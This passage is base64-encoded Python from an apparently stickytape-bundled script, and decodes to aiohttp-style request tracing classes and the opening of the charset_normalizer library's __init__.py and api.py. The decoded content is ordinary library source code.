G9uc2U6IENsaWVudFJlc3BvbnNlXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFRyYWNlQ29ubmVjdGlvblF1ZXVlZFN0YXJ0UGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fY29ubmVjdGlvbl9xdWV1ZWRfc3RhcnRgIHNpZ25hbCIiIlxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBUcmFjZUNvbm5lY3Rpb25RdWV1ZWRFbmRQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9jb25uZWN0aW9uX3F1ZXVlZF9lbmRgIHNpZ25hbCIiIlxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBUcmFjZUNvbm5lY3Rpb25DcmVhdGVTdGFydFBhcmFtczpcclxuICAgICIiIlBhcmFtZXRlcnMgc2VudCBieSB0aGUgYG9uX2Nvbm5lY3Rpb25fY3JlYXRlX3N0YXJ0YCBzaWduYWwiIiJcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VDb25uZWN0aW9uQ3JlYXRlRW5kUGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fY29ubmVjdGlvbl9jcmVhdGVfZW5kYCBzaWduYWwiIiJcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VDb25uZWN0aW9uUmV1c2Vjb25uUGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fY29ubmVjdGlvbl9yZXVzZWNvbm5gIHNpZ25hbCIiIlxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBUcmFjZURuc1Jlc29sdmVIb3N0U3RhcnRQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9kbnNfcmVzb2x2ZWhvc3Rfc3RhcnRgIHNpZ25hbCIiIlxyXG5cclxuICAgIGhvc3Q6IHN0clxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBUcmFjZURuc1Jlc29sdmVIb3N0RW5kUGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fZG5zX3Jlc29sdmVob3N0X2VuZGAgc2lnbmFsIiIiXHJcblxyXG4gICAgaG9zdDogc3RyXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFRyYWNlRG5zQ2FjaGVIaXRQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9kbnNfY2FjaGVfaGl0YCBzaWduYWwiIiJcclxuXHJcbiAgICBob3N0OiBzdHJcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgVHJhY2VEbnNDYWNoZU1pc3NQYXJhbXM6XHJcbiAgICAiIiJQYXJhbWV0ZXJzIHNlbnQgYnkgdGhlIGBvbl9kbnNfY2FjaGVfbWlzc2Agc2lnbmFsIiIiXHJcblxyXG4gICAgaG9zdDogc3RyXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFRyYWNlUmVxdWVzdEhlYWRlcnNTZW50UGFyYW1zOlxyXG4gICAgIiIiUGFyYW1ldGVycyBzZW50IGJ5IHRoZSBgb25fcmVxdWVzdF9oZWFkZXJzX3NlbnRgIHNpZ25hbCIiIlxyXG5cclxuICAgIG1ldGhvZDogc3RyXHJcbiAgICB1cmw6IFVSTFxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcblxyXG5cclxuY2xhc3MgVHJhY2U6XHJcbiAgICAiIiJJbnRlcm5hbCBkZXBlbmRlbmN5IGhvbGRlciBjbGFzcy5cclxuXHJcbiAgICBVc2VkIHRvIGtlZXAgdG9nZXRoZXIgdGhlIG1haW4gZGVwZW5kZW5jaWVzIHVzZWRcclxuICAgIGF0IHRoZSBtb21lbnQgb2Ygc2VuZCBhIHNpZ25hbC5cclxuICAgICIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHNlc3Npb246ICJDbGllbnRTZXNzaW9uIixcclxuICAgICAgICB0cmFjZV9jb25maWc6IFRyYWNlQ29uZmlnLFxyXG4gICAgICAgIHRyYWNlX2NvbmZpZ19jdHg6IFNpbXBsZU5hbWVzcGFjZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl90cmFjZV9jb25maWcgPSB0cmFjZV9jb25maWdcclxuICAgICAgICBzZWxmLl90cmFjZV9jb25maWdfY3R4ID0gdHJhY2VfY29uZmlnX2N0eFxyXG4gICAgICAgIHNlbGYuX3Nlc3Npb24gPSBzZXNzaW9uXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfcmVxdWVzdF9zdGFydChcclxuICAgICAgICBzZWxmLCBtZXRob2Q6IHN0ciwgdXJsOiBVUkwsIGhlYWRlcnM6ICJDSU11bHRpRGljdFtzdHJdIlxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fcmVxdWVzdF9zdGFydC5zZW5kKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXNzaW9uLFxyXG4gICAgICAgICAgICBzZWxmLl90cmFjZV9jb25maWdfY3R4LFxyXG4gICAgICAgICAgICBUcmFjZVJlcXVlc3RTdGFydFBhcmFtcyhtZXRob2QsIHVybCwgaGVhZGVycyksXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kX3JlcXVlc3RfY2h1bmtfc2VudChcclxuICAgICAgICBzZWxmLCBtZXRob2Q6IHN0ciwgdXJsOiBVUkwsIGNodW5rOiBieXRlc1xyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fcmVxdWVzdF9jaHVua19zZW50LnNlbmQoXHJcbiAgICAgICAgICAgIHNlbGYuX3Nlc3Npb24sXHJcbiAgICAgICAgICAgIHNlbGYuX3RyYWNlX2NvbmZpZ19jdHgsXHJcbiAgICAgICAgICAgIFRyYWNlUmVxdWVzdENodW5rU2VudFBhcmFtcyhtZXRob2QsIHVybCwgY2h1bmspLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9yZXNwb25zZV9jaHVua19yZWNlaXZlZChcclxuICAgICAgICBzZWxmLCBtZXRob2Q6IHN0ciwgdXJsOiBVUkwsIGNodW5rOiBieXRlc1xyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fcmVzcG9uc2VfY2h1bmtfcmVjZWl2ZWQuc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbixcclxuICAgICAgICAgICAgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCxcclxuICAgICAgICAgICAgVHJhY2VSZXNwb25zZUNodW5rUmVjZWl2ZWRQYXJhbXMobWV0aG9kLCB1cmwsIGNodW5rKSxcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfcmVxdWVzdF9lbmQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtZXRob2Q6IHN0cixcclxuICAgICAgICB1cmw6IFVSTCxcclxuICAgICAgICBoZWFkZXJzOiAiQ0lNdWx0aURpY3Rbc3RyXSIsXHJcbiAgICAgICAgcmVzcG9uc2U6IENsaWVudFJlc3BvbnNlLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fcmVxdWVzdF9lbmQuc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbixcclxuICAgICAgICAgICAgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCxcclxuICAgICAgICAgICAgVHJhY2VSZXF1ZXN0RW5kUGFyYW1zKG1ldGhvZCwgdXJsLCBoZWFkZXJzLCByZXNwb25zZSksXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kX3JlcXVlc3RfZXhjZXB0aW9uKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbWV0aG9kOiBzdHIsXHJcbiAgICAgICAgdXJsOiBVUkwsXHJcbiAgICAgICAgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iLFxyXG4gICAgICAgIGV4Y2VwdGlvbjogQmFzZUV4Y2VwdGlvbixcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fdHJhY2VfY29uZmlnLm9uX3JlcXVlc3RfZXhjZXB0aW9uLnNlbmQoXHJcbiAgICAgICAgICAgIHNlbGYuX3Nlc3Npb24sXHJcbiAgICAgICAgICAgIHNlbGYuX3RyYWNlX2NvbmZpZ19jdHgsXHJcbiAgICAgICAgICAgIFRyYWNlUmVxdWVzdEV4Y2VwdGlvblBhcmFtcyhtZXRob2QsIHVybCwgaGVhZGVycywgZXhjZXB0aW9uKSxcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfcmVxdWVzdF9yZWRpcmVjdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1ldGhvZDogc3RyLFxyXG4gICAgICAgIHVybDogVVJMLFxyXG4gICAgICAgIGhlYWRlcnM6ICJDSU11bHRpRGljdFtzdHJdIixcclxuICAgICAgICByZXNwb25zZTogQ2xpZW50UmVzcG9uc2UsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX3RyYWNlX2NvbmZpZy5fb25fcmVxdWVzdF9yZWRpcmVjdC5zZW5kKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXNzaW9uLFxyXG4gICAgICAgICAgICBzZWxmLl90cmFjZV9jb25maWdfY3R4LFxyXG4gICAgICAgICAgICBUcmFjZVJlcXVlc3RSZWRpcmVjdFBhcmFtcyhtZXRob2QsIHVybCwgaGVhZGVycywgcmVzcG9uc2UpLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9jb25uZWN0aW9uX3F1ZXVlZF9zdGFydChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fY29ubmVjdGlvbl9xdWV1ZWRfc3RhcnQuc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbiwgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCwgVHJhY2VDb25uZWN0aW9uUXVldWVkU3RhcnRQYXJhbXMoKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9jb25uZWN0aW9uX3F1ZXVlZF9lbmQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fdHJhY2VfY29uZmlnLm9uX2Nvbm5lY3Rpb25fcXVldWVkX2VuZC5zZW5kKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXNzaW9uLCBzZWxmLl90cmFjZV9jb25maWdfY3R4LCBUcmFjZUNvbm5lY3Rpb25RdWV1ZWRFbmRQYXJhbXMoKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9jb25uZWN0aW9uX2NyZWF0ZV9zdGFydChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fY29ubmVjdGlvbl9jcmVhdGVfc3RhcnQuc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbiwgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCwgVHJhY2VDb25uZWN0aW9uQ3JlYXRlU3RhcnRQYXJhbXMoKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9jb25uZWN0aW9uX2NyZWF0ZV9lbmQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fdHJhY2VfY29uZmlnLm9uX2Nvbm5lY3Rpb25fY3JlYXRlX2VuZC5zZW5kKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXNzaW9uLCBzZWxmLl90cmFjZV9jb25maWdfY3R4LCBUcmFjZUNvbm5lY3Rpb25DcmVhdGVFbmRQYXJhbXMoKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgc2VuZF9jb25uZWN0aW9uX3JldXNlY29ubihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fY29ubmVjdGlvbl9yZXVzZWNvbm4uc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbiwgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCwgVHJhY2VDb25uZWN0aW9uUmV1c2Vjb25uUGFyYW1zKClcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfZG5zX3Jlc29sdmVob3N0X3N0YXJ0KHNlbGYsIGhvc3Q6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fdHJhY2VfY29uZmlnLm9uX2Ruc19yZXNvbHZlaG9zdF9zdGFydC5zZW5kKFxyXG4gICAgICAgICAgICBzZWxmLl9zZXNzaW9uLCBzZWxmLl90cmFjZV9jb25maWdfY3R4LCBUcmFjZURuc1Jlc29sdmVIb3N0U3RhcnRQYXJhbXMoaG9zdClcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfZG5zX3Jlc29sdmVob3N0X2VuZChzZWxmLCBob3N0OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX3RyYWNlX2NvbmZpZy5vbl9kbnNfcmVzb2x2ZWhvc3RfZW5kLnNlbmQoXHJcbiAgICAgICAgICAgIHNlbGYuX3Nlc3Npb24sIHNlbGYuX3RyYWNlX2NvbmZpZ19jdHgsIFRyYWNlRG5zUmVzb2x2ZUhvc3RFbmRQYXJhbXMoaG9zdClcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfZG5zX2NhY2hlX2hpdChzZWxmLCBob3N0OiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX3RyYWNlX2NvbmZpZy5vbl9kbnNfY2FjaGVfaGl0LnNlbmQoXHJcbiAgICAgICAgICAgIHNlbGYuX3Nlc3Npb24sIHNlbGYuX3RyYWNlX2NvbmZpZ19jdHgsIFRyYWNlRG5zQ2FjaGVIaXRQYXJhbXMoaG9zdClcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfZG5zX2NhY2hlX21pc3Moc2VsZiwgaG9zdDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl90cmFjZV9jb25maWcub25fZG5zX2NhY2hlX21pc3Muc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbiwgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCwgVHJhY2VEbnNDYWNoZU1pc3NQYXJhbXMoaG9zdClcclxuICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfcmVxdWVzdF9oZWFkZXJzKFxyXG4gICAgICAgIHNlbGYsIG1ldGhvZDogc3RyLCB1cmw6IFVSTCwgaGVhZGVyczogIkNJTXVsdGlEaWN0W3N0cl0iXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX3RyYWNlX2NvbmZpZy5fb25fcmVxdWVzdF9oZWFkZXJzX3NlbnQuc2VuZChcclxuICAgICAgICAgICAgc2VsZi5fc2Vzc2lvbixcclxuICAgICAgICAgICAgc2VsZi5fdHJhY2VfY29uZmlnX2N0eCxcclxuICAgICAgICAgICAgVHJhY2VSZXF1ZXN0SGVhZGVyc1NlbnRQYXJhbXMobWV0aG9kLCB1cmwsIGhlYWRlcnMpLFxyXG4gICAgICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NoYXJzZXRfbm9ybWFsaXplci9fX2luaXRfXy5weScsIGInIyAtKi0gY29kaW5nOiB1dGZfOCAtKi1cbiIiIlxuQ2hhcnNldC1Ob3JtYWxpemVyXG5+fn5+fn5+fn5+fn5+flxuVGhlIFJlYWwgRmlyc3QgVW5pdmVyc2FsIENoYXJzZXQgRGV0ZWN0b3IuXG5BIGxpYnJhcnkgdGhhdCBoZWxwcyB5b3UgcmVhZCB0ZXh0IGZyb20gYW4gdW5rbm93biBjaGFyc2V0IGVuY29kaW5nLlxuTW90aXZhdGVkIGJ5IGNoYXJkZXQsIFRoaXMgcGFja2FnZSBpcyB0cnlpbmcgdG8gcmVzb2x2ZSB0aGUgaXNzdWUgYnkgdGFraW5nIGEgbmV3IGFwcHJvYWNoLlxuQWxsIElBTkEgY2hhcmFjdGVyIHNldCBuYW1lcyBmb3Igd2hpY2ggdGhlIFB5dGhvbiBjb3JlIGxpYnJhcnkgcHJvdmlkZXMgY29kZWNzIGFyZSBzdXBwb3J0ZWQuXG5cbkJhc2ljIHVzYWdlOlxuICAgPj4+IGZyb20gY2hhcnNldF9ub3JtYWxpemVyIGltcG9ydCBmcm9tX2J5dGVzXG4gICA+Pj4gcmVzdWx0cyA9IGZyb21fYnl0ZXMoXCdCXHhkMVx4ODFceGQwXHhiNVx4ZDBceGJhXHhkMFx4YjggXHhkMVx4ODdceGQwXHhiZVx4ZDBceGIyXHhkMFx4YjVceGQwXHhiYSBceGQwXHhiOFx4ZDBceGJjXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGIwXHhkMFx4YjJceGQwXHhiZSBceGQwXHhiZFx4ZDBceGIwIFx4ZDBceGJlXHhkMFx4YjFceGQxXHg4MFx4ZDBceGIwXHhkMFx4YjdceGQwXHhiZVx4ZDBceGIyXHhkMFx4YjBceGQwXHhiZFx4ZDBceGI4XHhkMFx4YjUuIE9ceGQwXHhiMVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiN1x4ZDBceGJlXHhkMFx4YjJceGQwXHhiMFx4ZDBceGJkXHhkMFx4YjhceGQwXHhiNVx4ZDFceDgyXHhkMFx4YmUhXCcuZW5jb2RlKFwndXRmXzhcJykpXG4gICA+Pj4gYmVzdF9ndWVzcyA9IHJlc3VsdHMuYmVzdCgpXG4gICA+Pj4gc3RyKGJlc3RfZ3Vlc3MpXG4gICBcJ0JceGQxXHg4MVx4ZDBceGI1XHhkMFx4YmFceGQwXHhiOCBceGQxXHg4N1x4ZDBceGJlXHhkMFx4YjJceGQwXHhiNVx4ZDBceGJhIFx4ZDBceGI4XHhkMFx4YmNceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjBceGQwXHhiMlx4ZDBceGJlIFx4ZDBceGJkXHhkMFx4YjAgXHhkMFx4YmVceGQwXHhiMVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiN1x4ZDBceGJlXHhkMFx4YjJceGQwXHhiMFx4ZDBceGJkXHhkMFx4YjhceGQwXHhiNS4gT1x4ZDBceGIxXHhkMVx4ODBceGQwXHhiMFx4ZDBceGI3XHhkMFx4YmVceGQwXHhiMlx4ZDBceGIwXHhkMFx4YmRceGQwXHhiOFx4ZDBceGI1XHhkMVx4ODJceGQwXHhiZSFcJ1xuXG5PdGhlcnMgbWV0aG9kcyBhbmQgdXNhZ2VzIGFyZSBhdmFpbGFibGUgLSBzZWUgdGhlIGZ1bGwgZG9jdW1lbnRhdGlvblxuYXQgPGh0dHBzOi8vZ2l0aHViLmNvbS9PdXNyZXQvY2hhcnNldF9ub3JtYWxpemVyPi5cbjpjb3B5cmlnaHQ6IChjKSAyMDIxIGJ5IEFobWVkIFRBSFJJXG46bGljZW5zZTogTUlULCBzZWUgTElDRU5TRSBmb3IgbW9yZSBkZXRhaWxzLlxuIiIiXG5pbXBvcnQgbG9nZ2luZ1xuXG5mcm9tIC5hcGkgaW1wb3J0IGZyb21fYnl0ZXMsIGZyb21fZnAsIGZyb21fcGF0aCwgbm9ybWFsaXplXG5mcm9tIC5sZWdhY3kgaW1wb3J0IChcbiAgICBDaGFyc2V0RGV0ZWN0b3IsXG4gICAgQ2hhcnNldERvY3RvcixcbiAgICBDaGFyc2V0Tm9ybWFsaXplck1hdGNoLFxuICAgIENoYXJzZXROb3JtYWxpemVyTWF0Y2hlcyxcbiAgICBkZXRlY3QsXG4pXG5mcm9tIC5tb2RlbHMgaW1wb3J0IENoYXJzZXRNYXRjaCwgQ2hhcnNldE1hdGNoZXNcbmZyb20gLnV0aWxzIGltcG9ydCBzZXRfbG9nZ2luZ19oYW5kbGVyXG5mcm9tIC52ZXJzaW9uIGltcG9ydCBWRVJTSU9OLCBfX3ZlcnNpb25fX1xuXG5fX2FsbF9fID0gKFxuICAgICJmcm9tX2ZwIixcbiAgICAiZnJvbV9wYXRoIixcbiAgICAiZnJvbV9ieXRlcyIsXG4gICAgIm5vcm1hbGl6ZSIsXG4gICAgImRldGVjdCIsXG4gICAgIkNoYXJzZXRNYXRjaCIsXG4gICAgIkNoYXJzZXRNYXRjaGVzIixcbiAgICAiQ2hhcnNldE5vcm1hbGl6ZXJNYXRjaCIsXG4gICAgIkNoYXJzZXROb3JtYWxpemVyTWF0Y2hlcyIsXG4gICAgIkNoYXJzZXREZXRlY3RvciIsXG4gICAgIkNoYXJzZXREb2N0b3IiLFxuICAgICJfX3ZlcnNpb25fXyIsXG4gICAgIlZFUlNJT04iLFxuICAgICJzZXRfbG9nZ2luZ19oYW5kbGVyIixcbilcblxuIyBBdHRhY2ggYSBOdWxsSGFuZGxlciB0byB0aGUgdG9wIGxldmVsIGxvZ2dlciBieSBkZWZhdWx0XG4jIGh0dHBzOi8vZG9jcy5weXRob24ub3JnLzMuMy9ob3d0by9sb2dnaW5nLmh0bWwjY29uZmlndXJpbmctbG9nZ2luZy1mb3ItYS1saWJyYXJ5XG5cbmxvZ2dpbmcuZ2V0TG9nZ2VyKCJjaGFyc2V0X25vcm1hbGl6ZXIiKS5hZGRIYW5kbGVyKGxvZ2dpbmcuTnVsbEhhbmRsZXIoKSlcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjaGFyc2V0X25vcm1hbGl6ZXIvYXBpLnB5JywgYidpbXBvcnQgbG9nZ2luZ1xuZnJvbSBvcy5wYXRoIGltcG9ydCBiYXNlbmFtZSwgc3BsaXRleHRcbmZyb20gdHlwaW5nIGltcG9ydCBCaW5hcnlJTywgTGlzdCwgT3B0aW9uYWwsIFNldFxuXG50cnk6XG4gICAgZnJvbSBvcyBpbXBvcnQgUGF0aExpa2VcbmV4Y2VwdCBJbXBvcnRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxuICAgIFBhdGhMaWtlID0gc3RyICAjIHR5cGU6IGlnbm9yZVxuXG5mcm9tIC5jZCBpbXBvcnQgKFxuICAgIGNvaGVyZW5jZV9yYXRpbyxcbiAgICBlbmNvZGluZ19sYW5ndWFnZXMsXG4gICAgbWJfZW5jb2RpbmdfbGFuZ3VhZ2VzLFxuICAgIG1lcmdlX2NvaGVyZW5jZV9yYXRpb3MsXG4pXG5mcm9tIC5jb25zdGFudCBpbXBvcnQgSUFOQV9TVVBQT1JURUQsIFRPT19CSUdfU0VRVUVOQ0UsIFRPT19TTUFMTF9TRVFVRU5DRSwgVFJBQ0VcbmZyb20gLm1kIGltcG9ydCBtZXNzX3JhdGlvXG5mcm9tIC5tb2RlbHMgaW1wb3J0IENoYXJzZXRNYXRjaCwgQ2hhcnNldE1hdGNoZXNcbmZyb20gLnV0aWxzIGltcG9ydCAoXG4gICAgYW55X3NwZWNpZmllZF9lbmNvZGluZyxcbiAgICBpYW5hX25hbWUsXG4gICAgaWRlbnRpZnlfc2lnX29yX2JvbSxcbiAgICBpc19jcF9zaW1pbGFyLFxuICAgIGlzX211bHRpX2J5dGVfZW5jb2RpbmcsXG4gICAgc2hvdWxkX3N0cmlwX3NpZ19vcl9ib20sXG4pXG5cbiMgV2lsbCBtb3N0IGxpa2VseSBiZSBjb250cm92ZXJzaWFsXG4jIGxvZ2dpbmcuYWRkTGV2ZWxOYW1lKFRSQUNFLCAiVFJBQ0UiKVxubG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIoImNoYXJzZXRfbm9ybWFsaXplciIpXG5leHBsYWluX2hhbmRsZXIgPSBsb2dnaW5nLlN0cmVhbUhhbmRsZXIoKVxuZXhwbGFpbl9oYW5kbGVyLnNldEZvcm1hdHRlcihcbiAgICBsb2dnaW5nLkZvcm1hdHRlcigiJShhc2N0aW1lKXMgfCAlKGxldmVsbmFtZSlzIHwgJShtZXNzYWdlKXMiKVxuKVxuXG5cbmRlZiBmcm9tX2J5dGVzKFxuICAgIHNlcXVlbmNlczogYnl0ZXMsXG4gICAgc3RlcHM6IGludCA9IDUsXG4gICAgY2h1bmtfc2l6ZTogaW50ID0gNTEyLFxuICAgIHRocmVzaG9sZDogZmxvYXQgPSAwLjIsXG4gICAgY3BfaXNvbGF0aW9uOiBMaXN0W3N0cl0gPSBOb25lLFxuICAgIGNwX2V4Y2x1c2lvbjogTGlzdFtzdHJdID0gTm9uZSxcbiAgICBwcmVlbXB0aXZlX2JlaGF2aW91cjogYm9vbCA9IFRydWUsXG4gICAgZXhwbGFpbjogYm9vbCA9IEZhbHNlLFxuKSAtPiBDaGFyc2V0TWF0Y2hlczpcbiAgICAiIiJcbiAgICBHaXZlbiBhIHJhdyBieXRlcyBzZXF1ZW5jZSwgcmV0dXJuIHRoZSBiZXN0IHBvc3NpYmxlcyBjaGFyc2V0IHVzYWJsZSB0byByZW5kZXIgc3RyIG9iamVjdHMuXG4gICAgSWYgdGhlcmUgaXMgbm8gcmVzdWx0cywgaXQgaXMgYSBzdHJvbmcgaW5kaWNhdG9yIHRoYXQgdGhlIHNvdXJjZSBpcyBiaW5hcnkvbm90IHRleHQuXG4gICAgQnkgZGVmYXVsdCwgdGhlIHByb2Nlc3Mgd2lsbCBleHRyYWN0IDUgYmxvY3Mgb2YgNTEybyBlYWNoIHRvIGFzc2VzcyB0aGUgbWVzcyBhbmQgY29oZXJlbmNlIG9mIGEgZ2l2ZW4gc2VxdWVuY2UuXG4gICAgQW5kIHdpbGwgZ2l2ZSB1cCBhIHBhcnRpY3VsYXIgY29kZSBwYWdlIGFmdGVyIDIwJSBvZiBtZWFzdXJlZCBtZXNzLiBUaG9zZSBjcml0ZXJpYSBhcmUgY3VzdG9taXphYmxlIGF0IHdpbGwuXG5cbiAgICBUaGUgcHJlZW1wdGl2ZSBiZWhhdmlvciBET0VTIE5PVCByZXBsYWNlIHRoZSB0cmFkaXRpb25hbCBkZXRlY3Rpb24gd29ya2Zsb3csIGl0IHByaW9yaXRpemUgYSBwYXJ0aWN1bGFyIGNvZGUgcGFnZVxuICAgIGJ1dCBuZXZlciB0YWtlIGl0IGZvciBncmFudGVkLiBDYW4gaW1wcm92ZSB0aGUgcGVyZm9ybWFuY2UuXG5cbiAgICBZb3UgbWF5IHdhbnQgdG8gZm9jdXMgeW91ciBhdHRlbnRpb24gdG8gc29tZSBjb2RlIHBhZ2Ugb3IvYW5kIG5vdCBvdGhlcnMsIHVzZSBjcF9pc29sYXRpb24gYW5kIGNwX2V4Y2x1c2lvbiBmb3IgdGhhdFxuICAgIHB1cnBvc2UuXG5cbiAgICBUaGlzIGZ1bmN0aW9uIHdpbGwgc3RyaXAgdGhlIFNJRyBpbiB0aGUgcGF5bG9hZC9zZXF1ZW5jZSBldmVyeSB0aW1lIGV4Y2VwdCBvbiBVVEYtMTYsIFVURi0zMi5cbiAgICBCeSBkZWZhdWx0IHRoZSBsaWJyYXJ5IGRvZXMgbm90IHNldHVwIGFueSBoYW5kbGVyIG90aGVyIHRoYW4gdGhlIE51bGxIYW5kbGVyLCBpZiB5b3UgY2hvb3NlIHRvIHNldCB0aGUgXCdleHBsYWluXCdcbiAgICB0b2dnbGUgdG